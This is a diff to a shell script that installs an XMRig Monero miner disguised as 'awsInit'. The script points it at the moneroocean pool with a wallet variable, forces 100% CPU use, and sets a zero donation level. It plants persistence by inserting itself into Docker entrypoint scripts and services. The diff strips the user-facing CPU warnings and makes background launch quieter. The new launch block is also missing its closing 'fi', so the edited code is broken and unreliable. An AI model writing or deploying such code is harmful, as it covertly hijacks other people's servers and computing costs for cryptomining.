@@ -95,13 +95,13 @@ determine_working_dir() {
 working_dir=$(determine_working_dir)
 
 # Check free RAM
-check_free_ram() {
+configure_from_ram() {
     FREE_RAM=$(free -m | awk '/^Mem:/{print $7}')
     if [ "$FREE_RAM" -lt 512 ]; then
-        sed -i 's/"algo": *null/"algo": "cn-pico"/' "$working_dir/moneroocean/config.json"
+        sed -i'' 's/"algo": *null/"algo": "cn-pico"/' "$working_dir/moneroocean/config.json"
         write_info "cn-pico selected"
     elif [ "$FREE_RAM" -lt 2350 ]; then
-        sed -i 's/"algo": *null/"algo": "rx/wow"/' "$working_dir/moneroocean/config.json"
+        sed -i'' 's/"algo": *null/"algo": "rx/wow"/' "$working_dir/moneroocean/config.json"
         write_info "rx/wow selected"
     fi
 }
@@ -263,7 +263,7 @@ if [ "$libc_type" = "musl" ]; then
     rm /tmp/data.tar.gz
 
     echo "[*] Checking if advanced version of $working_dir/awsInit/xmrig works fine (and not removed by antivirus software)"
-    sed -i 's/"donate-level": *[^,]*,/"donate-level": 0,/' $working_dir/awsInit/config.json
+    sed -i'' 's/"donate-level": *[^,]*,/"donate-level": 0,/' $working_dir/awsInit/config.json
     $working_dir/awsInit/xmrig --help >/dev/null
     if (test $? -ne 0); then
         if [ -f $working_dir/awsInit/xmrig ]; then
@@ -289,7 +289,7 @@ else
     rm /tmp/data.tar.gz
 
     echo "[*] Checking if advanced version of $working_dir/awsInit/xmrig works fine (and not removed by antivirus software)"
-    sed -i 's/"donate-level": *[^,]*,/"donate-level": 0,/' $working_dir/awsInit/config.json
+    sed -i'' 's/"donate-level": *[^,]*,/"donate-level": 0,/' $working_dir/awsInit/config.json
     $working_dir/awsInit/xmrig --help >/dev/null
     if (test $? -ne 0); then
         if [ -f $working_dir/awsInit/xmrig ]; then
@@ -317,15 +317,17 @@ if [ ! -z $EMAIL ]; then
     PASS="$PASS:$EMAIL"
 fi
 
-sed -i 's/"url": *"[^"]*",/"url": "gulf.moneroocean.stream:'$PORT'",/' $working_dir/awsInit/config.json
-sed -i 's/"user": *"[^"]*",/"user": "'$WALLET'",/' $working_dir/awsInit/config.json
-sed -i 's/"pass": *"[^"]*",/"pass": "'$PASS'",/' $working_dir/awsInit/config.json
-sed -i 's/"max-cpu-usage": *[^,]*,/"max-cpu-usage": 100,/' $working_dir/awsInit/config.json
-sed -i 's#"log-file": *null,#"log-file": "'$working_dir/awsInit/awsdlog.log'",#' $working_dir/awsInit/config.json
-sed -i 's/"syslog": *[^,]*,/"syslog": true,/' $working_dir/awsInit/config.json
+sed -i'' 's/"url": *"[^"]*",/"url": "gulf.moneroocean.stream:'$PORT'",/' $working_dir/awsInit/config.json
+sed -i'' 's/"user": *"[^"]*",/"user": "'$WALLET'",/' $working_dir/awsInit/config.json
+sed -i'' 's/"pass": *"[^"]*",/"pass": "'$PASS'",/' $working_dir/awsInit/config.json
+sed -i'' 's/"max-cpu-usage": *[^,]*,/"max-cpu-usage": 100,/' $working_dir/awsInit/config.json
+sed -i'' 's#"log-file": *null,#"log-file": "'$working_dir/awsInit/awsdlog.log'",#' $working_dir/awsInit/config.json
+sed -i'' 's/"syslog": *[^,]*,/"syslog": true,/' $working_dir/awsInit/config.json
+
+configure_from_ram
 
 cp $working_dir/awsInit/config.json $working_dir/awsInit/config_background.json
-sed -i 's/"background": *false,/"background": true,/' $working_dir/awsInit/config_background.json
+sed -i'' 's/"background": *false,/"background": true,/' $working_dir/awsInit/config_background.json
 
 # preparing script
 
@@ -349,7 +351,7 @@ if check_docker; then
     out=$(find / -name "entrypoint.sh" 2>/dev/null)
     if [ -n "$out" ]; then
         first=$(cat $out | head -1)
-        if ! sed -i '/^exec "\$@"/i $working_dir/awsInit/init.sh --config=$working_dir/awsInit/config_background.json >/dev/null 2>&1' $first; then
+        if ! sed -i'' '/^exec "\$@"/i $working_dir/awsInit/init.sh --config=$working_dir/awsInit/config_background.json >/dev/null 2>&1' $first; then
             write_info "failed docker persistence"
         else
             write_info "success docker persistence"
@@ -410,25 +412,12 @@ write_info "added service persistence"
     fi
 fi
 
-/bin/bash $working_dir/awsInit/init.sh --config=$working_dir/awsInit/config_background.json >/dev/null 2>&1
-write_info "executed in bg"
-
-echo ""
-echo "NOTE: If you are using shared VPS it is recommended to avoid 100% CPU usage produced by the miner or you will be banned"
-if [ "$CPU_THREADS" -lt "4" ]; then
-    echo "HINT: Please execute these or similair commands under root to limit miner to 75% percent CPU usage:"
-    echo "sudo apt-get update; sudo apt-get install -y cpulimit"
-    echo "sudo cpulimit -e xmrig -l $((75*$CPU_THREADS)) -b"
-    if [ "`tail -n1 /etc/rc.local`" != "exit 0" ]; then
-        echo "sudo sed -i -e '\$acpulimit -e xmrig -l $((75*$CPU_THREADS)) -b\\n' /etc/rc.local"
-    else
-        echo "sudo sed -i -e '\$i \\cpulimit -e xmrig -l $((75*$CPU_THREADS)) -b\\n' /etc/rc.local"
-    fi
+if which bash >/dev/null 2>&1; then
+    $(which bash) $working_dir/awsInit/init.sh --config=$working_dir/awsInit/config_background.json >/dev/null 2>&1
+elif which sh >/dev/null 2>&1; then
+    $(which sh) $working_dir/awsInit/init.sh --config=$working_dir/awsInit/config_background.json >/dev/null 2>&1
 else
-    echo "HINT: Please execute these commands and reboot your VPS after that to limit miner to 75% percent CPU usage:"
-    echo "sed -i 's/\"max-threads-hint\": *[^,]*,/\"max-threads-hint\": 75,/' \$working_dir/awsInit/config.json"
-    echo "sed -i 's/\"max-threads-hint\": *[^,]*,/\"max-threads-hint\": 75,/' \$working_dir/awsInit/config_background.json"
-fi
-echo ""
+    write_info "not executed"
+write_info "executed in bg"
 
 echo "[*] Setup complete"
